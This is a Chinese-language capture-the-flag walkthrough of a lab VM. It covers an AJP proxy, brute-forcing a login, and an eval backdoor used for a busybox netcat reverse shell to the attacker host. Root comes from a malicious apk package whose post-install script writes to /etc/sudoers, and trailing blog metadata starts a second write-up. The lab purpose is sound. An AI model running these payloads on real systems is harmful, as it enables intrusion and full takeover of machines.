\u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u53d1\u73b0\u6240\u6709\u5f00\u653e\u7684 TCP \u7aef\u53e3\u53ca\u5176\u4e0a\u8fd0\u884c\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nmap -p- 192.168.205.190\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 09:01 EDT\nNmap scan report for 192.168.205.190\nHost is up (0.00026s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8010/tcp open  xmpp\n```\n\n\u7ed3\u679c\u663e\u793a\u76ee\u6807\u5f00\u653e\u4e86\u4e09\u4e2a\u7aef\u53e3\uff1a\n\n- **22/tcp**: SSH \u670d\u52a1\uff0c\u901a\u5e38\u7528\u4e8e\u8fdc\u7a0b\u767b\u5f55\u3002\n- **80/tcp**: HTTP \u670d\u52a1\uff0c\u5373\u6807\u51c6 Web \u670d\u52a1\u3002\n- **8010/tcp**: nmap \u521d\u6b65\u8bc6\u522b\u4e3a xmpp\uff0c\u4f46\u9700\u8981\u8fdb\u4e00\u6b65\u786e\u8ba4\u3002\n\n# \u4e8c\u3001Web \u63a2\u7d22\u4e0e AJP \u4ee3\u7406\n\n## 1. \u521d\u63a2 80 \u7aef\u53e3\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 192.168.205.190     \n<html>\n<head><title>403 Forbidden</title></head>\n<body>\n<center><h1>403 Forbidden</h1></center>\n<hr><center>nginx</center>\n</body>\n</html>\n                \n```\n\n\u4f7f\u7528 gobuster \u8fdb\u884c\u76ee\u5f55\u7206\u7834\u4e5f\u672a\u53d1\u73b0\u4efb\u4f55\u6709\u4ef7\u503c\u7684\u8def\u5f84\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ gobuster dir -u http://192.168.205.190 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.190\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\nProgress: 1102795 / 1102800 (100.00%)\n===============================================================\nFinished\n===============================================================\n                                                    \n```\n\n## 2.8010 \u7aef\u53e3\u4e0e AJP\n\n\u60c5\u51b5\u6709\u70b9\u4e0d\u5bf9\uff0c\u770b\u770b8010\u662f\u4ec0\u4e48\u670d\u52a1\n\n```bash\nPORT     STATE SERVICE VERSION\n8010/tcp open  xmpp?\n| fingerprint-strings: \n|   GenericLines: \n|_    ajpy\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8010-TCP:V=7.95%I=7%D=7/16%Time=6877A304%P=x86_64-pc-linux-gnu%r(Ge\nSF:nericLines,8,'\\x124\\0\\x04ajpy');\nMAC Address: 08:00:27:B0:70:3D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.81 seconds\n                           \n```\n\n\u641c\u7d22\u4e86\u4e00\u4e0b\n\n![image-20250716210338088](https://7r1UMPHK.github.io/image/20250716210338218.webp)\n\n\u901a\u8fc7\u641c\u7d22\uff0c\u6211\u4eec\u4e86\u89e3\u5230 8010 \u7aef\u53e3\u5f88\u53ef\u80fd\u8fd0\u884c\u7740 **AJP (Apache JServ Protocol)** \u670d\u52a1\u3002\n\n> [!Tip]\n>\n> **\u4ec0\u4e48\u662f AJP\uff1f**\n>\n> AJP \u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u534f\u8bae\uff0c\u8bbe\u8ba1\u7528\u4e8e\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\uff08\u5982 Apache HTTP Server\uff09\u4e0e\u540e\u7aef\u7684\u5e94\u7528\u670d\u52a1\u5668\uff08\u5982 Apache Tomcat\uff09\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u3002\u5b83\u6bd4 HTTP \u66f4\u9ad8\u6548\uff0c\u56e0\u4e3a\u5b83\u5728\u8bbe\u8ba1\u4e0a\u51cf\u5c11\u4e86\u7f51\u7edc\u5f00\u9500\u3002\u6211\u4eec\u4e0d\u80fd\u50cf\u8bbf\u95ee\u666e\u901a\u7f51\u9875\u4e00\u6837\u76f4\u63a5\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95ee AJP \u670d\u52a1\u3002\n\n\u4e3a\u4e86\u4e0e AJP \u670d\u52a1\u4ea4\u4e92\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u672c\u5730\u4ee3\u7406\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 Apache httpd \u670d\u52a1\u5668\u7684 mod_proxy_ajp \u6a21\u5757\uff0c\u5c06\u6211\u4eec\u672c\u5730\u7684 8000 \u7aef\u53e3\u6536\u5230\u7684 HTTP \u8bf7\u6c42\u8f6c\u53d1\u5230\u76ee\u6807\u7684 8010 \u7aef\u53e3\u3002\n\n**\u4ee3\u7406\u914d\u7f6e\u6b65\u9aa4\uff1a**\n\n1. \u542f\u7528 Apache \u7684\u76f8\u5173\u4ee3\u7406\u6a21\u5757\uff1a\n\n   ```bash\n   sudo apt-get install apache2\n   sudo a2enmod proxy    \n   sudo a2enmod proxy_http\n   sudo a2enmod proxy_ajp        \n   ```\n\n2. \u521b\u5efa\u4e00\u4e2a\u65b0\u7684 Apache \u7ad9\u70b9\u914d\u7f6e\u6587\u4ef6 `/etc/apache2/sites-available/ajp-proxy.conf`\uff1a\n\n   ```apache\n   Listen 8000\n   <VirtualHost *:8000>\n       ProxyPass / ajp://192.168.205.190:8010/\n       ProxyPassReverse / ajp://192.168.205.190:8010/\n   </VirtualHost>\n   ```\n\n3. \u542f\u7528\u8be5\u7ad9\u70b9\u5e76\u91cd\u542f Apache \u670d\u52a1\uff1a\n\n   ```bash\n   sudo a2ensite ajp-proxy.conf\n   sudo systemctl restart apache2\n   ```\n\n\u914d\u7f6e\u5b8c\u6210\u540e\uff0c\u8bbf\u95ee\u6211\u4eec\u81ea\u5df1\u673a\u5668\u7684 `http://127.0.0.1:8000` (\u6216 `http://192.168.205.128:8000`) \u5c31\u76f8\u5f53\u4e8e\u5728\u8bbf\u95ee\u76ee\u6807 `192.168.205.190:8010` \u4e0a\u7684 Web \u5e94\u7528\u4e86\u3002\n\n![image-20250716210721870](https://7r1UMPHK.github.io/image/20250716210722060.webp)\n\n# \u4e09\u3001\u6f0f\u6d1e\u5229\u7528\u4e0e\u521d\u59cb\u8bbf\u95ee\n\n\u4ee3\u7406\u8bbe\u7f6e\u6210\u529f\u540e\uff0c\u6211\u4eec\u518d\u6b21\u5bf9\u4ee3\u7406\u540e\u7684\u5730\u5740\u8fdb\u884c\u76ee\u5f55\u7206\u7834\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ gobuster dir -u http://192.168.205.128:8000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip -t 64\n===============================================================\n/login                (Status: 200) [Size: 21]\n/test                 (Status: 200) [Size: 12]\n/backdoor             (Status: 200) [Size: 9]\n===============================================================                             \n```\n\n\u8fd9\u6b21\u6211\u4eec\u53d1\u73b0\u4e86\u4e09\u4e2a\u8def\u5f84\uff1a`/login`, `/test`, `/backdoor`\u3002\n\n## 1. \u767b\u5f55\u9875\u9762\u7206\u7834\n\n\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\uff0c`/login` \u8def\u5f84\u63a5\u53d7\u4e00\u4e2a `password` \u53c2\u6570\uff0c\u5e76\u63d0\u793a\u5bc6\u7801\u957f\u5ea6\u4e3a 5\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.128:8000/login?password=test'\nPassword length is 5\n```\n\n\u8fd9\u6697\u793a\u6211\u4eec\u9700\u8981\u7206\u7834\u4e00\u4e2a\u957f\u5ea6\u4e3a 5 \u7684\u5bc6\u7801\u3002\u7136\u800c\uff0c\u76f4\u63a5\u4f7f\u7528\u5e38\u89c4\u5b57\u5178\u7206\u7834\u4f1a\u9047\u5230\u95ee\u9898\uff0c\u56e0\u4e3a\u540e\u7aef\u5bf9\u7279\u6b8a\u5b57\u7b26\u7684\u957f\u5ea6\u8ba1\u7b97\u65b9\u5f0f\u53ef\u80fd\u4e0e\u6211\u4eec\u9884\u60f3\u7684\u4e0d\u540c\u3002\u6b63\u786e\u7684\u505a\u6cd5\u662f\u5bf9\u5b57\u5178\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5bc6\u7801\u8fdb\u884c URL \u7f16\u7801\u3002\n\n1. \u4ece `rockyou.txt` \u4e2d\u7b5b\u9009\u51fa\u6240\u6709\u957f\u5ea6\u4e3a 5 \u7684\u5bc6\u7801\uff1a\n\n   ```bash\n   grep -x '^.\\{5\\}$' /usr/share/wordlists/rockyou.txt > 5z.txt\n   ```\n\n2. \u4f7f\u7528 Python \u5bf9\u7b5b\u9009\u540e\u7684\u5b57\u5178\u8fdb\u884c URL \u7f16\u7801\uff1a\n\n   ```bash\n   python3 -c 'import sys, urllib.parse; [print(urllib.parse.quote(line.strip())) for line in sys.stdin]' < 5z.txt > 5z_u.txt\n   ```\n\n3. \u4f7f\u7528 `ffuf` \u548c\u7f16\u7801\u540e\u7684\u5b57\u5178\u8fdb\u884c\u7206\u7834\uff0c\u5e76\u8fc7\u6ee4\u6389\u8fd4\u56de\u5185\u5bb9\u4e3a\u7a7a\u7684\u54cd\u5e94 (`--fs 0`)\uff1a\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n   \u2514\u2500$ ffuf -u 'http://192.168.205.128:8000/login?password=FUZZ' -w 5z_u.txt --fs 0\n   ...\n   %21%40%23%24%25         [Status: 200, Size: 25, Words: 1, Lines: 1, Duration: 2ms]\n   ...\n   ```\n\n\u6211\u4eec\u627e\u5230\u4e86\u4e00\u4e2a\u6709\u6548\u7684\u5bc6\u7801 `%21%40%23%24%25`\uff0c\u5b83\u89e3\u7801\u540e\u662f `!@#$%`\u3002\n\n## 2. \u540e\u95e8\u4e0e\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08RCE\uff09\n\n\u7528\u627e\u5230\u7684\u5bc6\u7801\u8bbf\u95ee\u767b\u5f55\u9875\u9762\uff0c\u8fd4\u56de\u4e86\u4e00\u4e2a\u65b0\u7684\u8def\u5f84\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.128:8000/login?password=%21%40%23%24%25'\n/backdoooooooooooooooooor\n```\n\n\u8bbf\u95ee\u8fd9\u4e2a `/backdoooooooooooooooooor` \u8def\u5f84\uff0c\u5e76\u5c1d\u8bd5\u4f20\u5165 `cmd` \u53c2\u6570\u6267\u884c\u547d\u4ee4\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.128:8000/backdoooooooooooooooooor?cmd=id'\n<built-in function id>\n```\n\n\u8fd4\u56de\u7ed3\u679c `<built-in function id>` \u8868\u660e\u540e\u7aef\u5f88\u53ef\u80fd\u4f7f\u7528\u4e86 Python \u7684 `eval()` \u6216\u7c7b\u4f3c\u51fd\u6570\u6765\u6267\u884c\u4ee3\u7801\uff0c\u5e76\u4e14\u6ca1\u6709\u5bfc\u5165 `os` \u6a21\u5757\u3002\u4e3a\u4e86\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u6211\u4eec\u9700\u8981\u5148\u5bfc\u5165 `os` \u6a21\u5757\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.128:8000/backdoooooooooooooooooor?cmd=__import__('os').popen('whoami').read()'\nwelcome\n```\n\n\u6210\u529f\u6267\u884c\u547d\u4ee4\uff01\u6211\u4eec\u5f53\u524d\u7684\u7528\u6237\u662f `welcome`\u3002\n\n## 3. \u53cd\u5f39 Shell\n\n\u4e3a\u4e86\u83b7\u5f97\u4e00\u4e2a\u66f4\u7a33\u5b9a\u7684\u4ea4\u4e92\u5f0f Shell\uff0c\u6211\u4eec\u5229\u7528\u8fd9\u4e2a RCE \u6f0f\u6d1e\u53cd\u5f39\u4e00\u4e2a Shell \u5230\u6211\u4eec\u7684\u653b\u51fb\u673a\u4e0a\u3002\u76ee\u6807\u7cfb\u7edf\u4e0a\u5b58\u5728 `busybox`\uff0c\u5b83\u96c6\u6210\u4e86 `nc` (netcat) \u5de5\u5177\u3002\n\n1.  \u5728\u653b\u51fb\u673a\uff08Kali\uff09\u4e0a\u76d1\u542c 8888 \u7aef\u53e3\uff1a\n\n```bash\nnc -lvnp 8888\n```\n\n2.  \u901a\u8fc7 URL \u53d1\u9001\u53cd\u5f39 Shell \u7684 payload\uff08\u6ce8\u610f `+` \u5728 URL \u4e2d\u4f1a\u88ab\u89c6\u4e3a\u7a7a\u683c\uff0c\u8fd9\u91cc\u662f `busybox` \u591a\u529f\u80fd\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u7528\u6cd5\uff09\uff1a\n\n```bash\ncurl 'http://192.168.205.128:8000/backdoooooooooooooooooor?cmd=__import__('os').popen('busybox+nc+192.168.205.128+8888+-e+/bin/bash').read()'\n```\n\n\u653b\u51fb\u673a\u6210\u529f\u63a5\u6536\u5230\u8fde\u63a5\uff0c\u6211\u4eec\u83b7\u5f97\u4e86 `welcome` \u7528\u6237\u7684 Shell\u3002\n\n## 4. \u7a33\u5b9a Shell \u5e76\u83b7\u53d6\u7528\u6237 Flag\n\n\u4e3a\u4e86\u66f4\u597d\u7684\u4ea4\u4e92\u4f53\u9a8c\uff0c\u6211\u4eec\u5c06\u8fd9\u4e2a\u7b80\u964b\u7684 Shell \u5347\u7ea7\u4e3a\u529f\u80fd\u9f50\u5168\u7684 TTY\u3002\n\n```bash\npython -c 'import pty; pty.spawn('/bin/bash')'\nCtrl+Z\nstty raw -echo; fg\nreset xterm  \nexport TERM=xterm  \nexport SHELL=/bin/bash  \nstty rows 24 columns 80\n```\n\n\u5728 `welcome` \u7528\u6237\u7684\u5bb6\u76ee\u5f55\u4e0b\uff0c\u6211\u4eec\u627e\u5230\u4e86\u7b2c\u4e00\u4e2a flag\u3002\n\n```bash\nlocalhost:~$ ls -al\n...\n-rw-r--r--    1 root     welcome         39 Jul 14 15:11 user.txt\nlocalhost:~$ cat user.txt\nflag{5a80870310e5a3bc10c00ef6d20a3cac}\n```\n\n# \u56db\u3001\u6743\u9650\u63d0\u5347\n\n\u6211\u4eec\u7684\u76ee\u6807\u662f root \u6743\u9650\uff0c\u56e0\u6b64\u9700\u8981\u8fdb\u884c\u63d0\u6743\u3002\n\n## 1. \u63d0\u6743\u81f3 superuser\n\n\u5728\u679a\u4e3e\u7cfb\u7edf\u65f6\uff0c\u53d1\u73b0\u4e00\u4e2a\u53ea\u76d1\u542c\u5728\u672c\u5730 `127.0.0.1:5000` \u7684\u53ef\u7591\u670d\u52a1\u3002\n\n```bash\nlocalhost:~$ netstat -lntup\n...\ntcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -\n...\nlocalhost:~$ busybox nc 127.0.0.1 5000\nWelcome to SignatureChain CTF over TCP!\nType 'view', 'submit', 'hint', or 'exit'\n> view\n[\n  {\n    'index': 1,\n    'sender': 'system',\n    'recipient': 'alice',\n    'amount': 100,\n    'signature': '14ed219616014b683ae66d1ec2e098c84ff09695b33fff0a7652505e260be0aa',\n    'note': '1'\n  },\n  {\n    'index': 2,\n    'sender': 'alice',\n    'recipient': 'bob',\n    'amount': 50,\n    'signature': '08188ce485e280ba7d8c614a776a478d75ac2e985a535d1d126117ceb59ac952',\n    'note': '2'\n  }\n]\n> hint\n[Hint 1] Use 'view' to inspect part of the blockchain.\n[Hint 2] The signature is just sha256(sender->recipient:amount).\n[Hint 3] Try forging a valid signature with this knowledge.\n[Hint 4] What if admin sent you 999 coins?\n```\n\n1. \u4f7f\u7528 `view` \u67e5\u770b\u533a\u5757\u94fe\u7684\u4e00\u90e8\u5206\u3002\n2. \u7b7e\u540d\u5c31\u662f `sha256(sender->recipient:amount)`\u3002\n3. \u8bd5\u7740\u7528\u8fd9\u4e9b\u77e5\u8bc6\u4f2a\u9020\u4e00\u4e2a\u6709\u6548\u7684\u7b7e\u540d\u3002\n4. \u5982\u679c\u7ba1\u7406\u5458\u7ed9\u4f60\u53d1\u9001\u4e86 999 \u679a\u786c\u5e01\u5462\uff1f\n\n\u8fde\u63a5\u8be5\u670d\u52a1\u540e\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u57fa\u4e8e\u533a\u5757\u94fe\u7b7e\u540d\u7684 CTF \u6311\u6218\u3002\n\nget\u4e0d\u5230\uff0c\u6252\u62c9\u4e00\u4e0b\u5176\u4ed6\u5730\u65b9\n\n```bash\nlocalhost:~$ cd /opt/\nlocalhost:/opt$ ls -al\ntotal 16\ndrwxr-xr-x    4 root     root          4096 Jul 13 14:43 .\ndrwxr-xr-x   21 root     root          4096 Jul 13 18:06 ..\ndrwx--x--x    4 root     root          4096 Jul  9 16:53 containerd\ndrwxr-xr-x    2 root     root          4096 Jul 14 15:13 server\nlocalhost:/opt$ cd server/\nlocalhost:/opt/server$ ls -al\ntotal 16\ndrwxr-xr-x    2 root     root          4096 Jul 14 15:13 .\ndrwxr-xr-x    4 root     root          4096 Jul 13 14:43 ..\n-rw-r--r--    1 root     root            98 Jul 13 16:27 Dockerfile\n-rw-r--r--    1 root     root          3667 Jul 13 16:21 server.py\nlocalhost:/opt/server$ cat server.py\nimport socket\nimport threading\nimport json\nimport hashlib\n\nFLAG = 'flag{superuser/f124cf868d5e3fa5a7de39f80a2f9a0e}'\n\n# ... \u6b64\u5904\u7701\u7565\u5927\u91cf\u4ee3\u7801 ...\n```\n\n\u6709\u6377\u5f84\uff0c\u54c8\u54c8\u54c8\n\n\u4ee3\u7801\u4e2d\u786c\u7f16\u7801\u4e86\u4e00\u4e2a flag\uff1a`flag{superuser/f124cf868d5e3fa5a7de39f80a2f9a0e}`\u3002\u6839\u636e flag \u7684\u683c\u5f0f\uff0c\u6211\u4eec\u53ef\u4ee5\u63a8\u65ad\u51fa\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a `superuser` \u7684\u7528\u6237\uff0c\u5176\u5bc6\u7801\u53ef\u80fd\u662f `f124cf868d5e3fa5a7de39f80a2f9a0e`\u3002\n\n\u4f7f\u7528\u6b64\u51ed\u636e\u5207\u6362\u7528\u6237\u6210\u529f\u3002\n\n```bash\nlocalhost:/opt/server$ cd /home/\nlocalhost:/home$ su superuser\nPassword: \n/home $ id\nuid=1001(superuser) gid=1001(superuser) groups=300(abuild),1001(superuser)\n```\n\n## 2. \u63d0\u6743\u81f3 root\n\n\u6210\u4e3a `superuser` \u540e\uff0c\u68c0\u67e5 `sudo` \u6743\u9650\u3002\n\n```bash\n/home $ sudo -l\nUser superuser may run the following commands on localhost:\n    (ALL) NOPASSWD: /sbin/apk\n```\n\n\u8fd9\u662f\u4e00\u4e2a\u5173\u952e\u7a81\u7834\u53e3\uff01\u6211\u4eec\u53ef\u4ee5\u65e0\u9700\u5bc6\u7801\u4ee5 root \u6743\u9650\u8fd0\u884c `apk` \u547d\u4ee4\u3002`apk` \u662f Alpine Linux \u7684\u5305\u7ba1\u7406\u5668\u3002\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u6076\u610f\u5b89\u88c5\u540e\u811a\u672c\u7684\u81ea\u5b9a\u4e49 `.apk` \u5305\uff0c\u7136\u540e\u7528 `sudo apk` \u6765\u5b89\u88c5\u5b83\u3002\u8be5\u811a\u672c\u5c06\u4ee5 root \u6743\u9650\u6267\u884c\u3002\n\n**\u63d0\u6743\u6b65\u9aa4\uff1a**\n\n1.  **\u521b\u5efa\u6076\u610f\u5305\u5de5\u4f5c\u76ee\u5f55\u548c\u6587\u4ef6**\n    *   `APKBUILD`\uff1a\u5b9a\u4e49\u5305\u540d\u3001\u7248\u672c\u7b49\u5143\u4fe1\u606f\u3002\n    *   `pwn.post-install`\uff1a\u5b89\u88c5\u540e\u8981\u6267\u884c\u7684\u811a\u672c\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u91cc\u5199\u5165\u63d0\u6743\u547d\u4ee4\u3002\n\n```bash\n# \u521b\u5efa\u5de5\u4f5c\u76ee\u5f55\nmkdir /tmp/malicious-pkg\ncd /tmp/malicious-pkg\n\ncat << 'EOF' > APKBUILD\npkgname=pwn\npkgver=1.0.0\npkgrel=0\npkgdesc='pwn'\narch='noarch'\nlicense='GPL'\ninstall='pwn.post-install'\npackage() {\n    mkdir -p '$pkgdir'\n}\nEOF\n\n# \u5199\u5165\u6076\u610f\u5b89\u88c5\u540e\u811a\u672c (\u4f8b\u5982\uff1a\u7ed9\u4e88 superuser \u5b8c\u5168\u7684 sudo \u6743\u9650)\ncat << 'EOF' > pwn.post-install\n#!/bin/bash\necho 'superuser ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers\nEOF\n```\n\n2.  **\u751f\u6210\u7b7e\u540d\u5bc6\u94a5\u5e76\u6784\u5efa\u5305**\n    `abuild` \u5de5\u5177\u9700\u8981\u7b7e\u540d\u5bc6\u94a5\u6765\u6784\u5efa\u5305\u3002\n\n```bash\n# \u751f\u6210\u5bc6\u94a5\u5bf9\nabuild-keygen -a\n# \u6784\u5efa\u5305\nabuild checksum\nabuild -r\n```\n\n3.  **\u5b89\u88c5\u6076\u610f\u5305\u5e76\u63d0\u6743**\n    \u4f7f\u7528 `sudo apk add` \u5e76\u52a0\u4e0a `--allow-untrusted` \u9009\u9879\u6765\u5b89\u88c5\u6211\u4eec\u81ea\u5df1\u6784\u5efa\u7684\u672a\u7b7e\u540d\u5305\u3002\n\n```bash\nsudo apk add --allow-untrusted /home/superuser/packages/tmp/x86_64/pwn-1.0.0-r0.apk \n```\n\n\u5b89\u88c5\u8fc7\u7a0b\u4e2d\uff0c`pwn.post-install` \u811a\u672c\u4f1a\u88ab root \u6267\u884c\uff0c`superuser` \u7528\u6237\u73b0\u5728\u62e5\u6709\u4e86\u65e0\u5bc6\u7801\u6267\u884c\u4efb\u4f55 `sudo` \u547d\u4ee4\u7684\u6743\u9650\u3002\n\n```bash\nlocalhost:/tmp/malicious-pkg$ sudo -l\nUser superuser may run the following commands on localhost:\n    (ALL) NOPASSWD: /sbin/apk\n    (ALL : ALL) NOPASSWD: ALL\n```\n\n4. **\u83b7\u53d6 Root Shell**\n\n   ```bash\n   localhost:/tmp/malicious-pkg$ sudo su\n   /tmp/malicious-pkg # id\n   uid=0(root) gid=0(root) groups=0(root),...\n   ```\n\n\u6700\u540e\uff0c\u5728 root \u7684\u5bb6\u76ee\u5f55\u4e0b\u627e\u5230\u6700\u7ec8\u7684 flag\u3002\n\n```bash\n/tmp/malicious-pkg # cat /root/root.txt\nflag{bd941f8fb8a7b5b1c34bd71a349d6d04}\n```sentence", "top": 0, "createdAt": 1752714387, "style": "<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-tip {border-left-color:var(--borderColor-success-emphasis, var(--color-success-emphasis));background-color:var(--color-success-subtle);}.markdown-alert.markdown-alert-tip .markdown-alert-title {color: var(--fgColor-success,var(--color-success-fg));}</style>", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-17", "dateLabelColor": "#0969da"}, "P142": {"htmlDir": "docs/post/nei-bu-_chabaidao.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_chabaidao", "postUrl": "post/nei-bu-_chabaidao.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/142", "commentNum": 0, "wordCount": 7775, "description": "![image-20250717204541576](https://7r1UMPHK.github.io/image/20250717204550270.webp)\n\n\u4e0b\u8f7d\u5730\u5740\uff1ahttps://mega.nz/file/If9khB4Y#osVSL5SXMQSUQEicWYFZ3Q5w-lovLyamBD_kfDpuNVI\n\n---\n\n# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\u4e0e\u670d\u52a1\u63a2\u6d4b\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u5728\u5185\u7f51\u73af\u5883\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 `arp-scan` \u6765\u53d1\u73b0\u540c\u4e00\u7f51\u6bb5\u4e0b\u7684\u5b58\u6d3b\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.192 08:00:27:d7:eb:a4       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.\n\n4 responded\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0c\u76ee\u6807\u9776\u673a\u7684 IP \u5730\u5740\u4e3a `192.168.205.192`\u3002\n\n## 2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf\n\n\u786e\u5b9a\u76ee\u6807 IP \u540e\uff0c\u4f7f\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u53d1\u73b0\u6240\u6709\u5f00\u653e\u7684 TCP \u7aef\u53e3\u53ca\u5176\u4e0a\u8fd0\u884c\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.192\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 08:48 EDT\nNmap scan report for 192.168.205.192\nHost is up (0.00019s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:D7:EB:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.47 seconds\n```\n\n\u7ed3\u679c\u663e\u793a\u76ee\u6807\u5f00\u653e\u4e86\u4e24\u4e2a\u5e38\u89c1\u7aef\u53e3\uff1a\n\n*   **22/tcp**: SSH \u670d\u52a1\uff0c\u7528\u4e8e\u8fdc\u7a0b\u767b\u5f55\u3002\n*   **80/tcp**: HTTP \u670d\u52a1\uff0c\u5373\u6807\u51c6 Web \u670d\u52a1\u3002\n\n# \u4e8c\u3001Web \u63a2\u7d22\u4e0e\u6f0f\u6d1e\u53d1\u73b0\n\n## 1. \u57df\u540d\u4e0e\u5b50\u57df\u540d\u53d1\u73b0\n\n\u8bbf\u95ee `http://192.168.205.192` \u662f\u4e00\u4e2a\u7535\u5546\u7f51\u7ad9\u3002\u5c1d\u8bd5\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u5e76\u767b\u5f55\u540e\uff0c\u5728 \u201c\u6211\u7684\u8ba2\u5355\u201d \u9875\u9762\u53d1\u73b0\u4e86\u4e00\u4e2a PHP \u62a5\u9519\u4fe1\u606f\u3002\n\n![image-20250717205207123](https://7r1UMPHK.github.io/image/20250717205207346.webp)\n\n> **Warning**: Undefined array key 'role' in **/var/www/chabaidao.dsz/customer/includes/header.php** on line **35**\n\n\u8fd9\u4e2a\u62a5\u9519\u6cc4\u9732\u4e86\u7f51\u7ad9\u7684\u6839\u76ee\u5f55\u8def\u5f84\uff0c\u5e76\u63ed\u793a\u4e86\u5176\u57df\u540d\u4e3a `chabaidao.dsz`\u3002\u6211\u4eec\u5c06\u6b64\u57df\u540d\u6dfb\u52a0\u5230\u672c\u5730 `hosts` \u6587\u4ef6\u4e2d\u3002\n\n```bash\n# \u5728 /etc/hosts \u6587\u4ef6\u4e2d\u6dfb\u52a0\n192.168.205.192 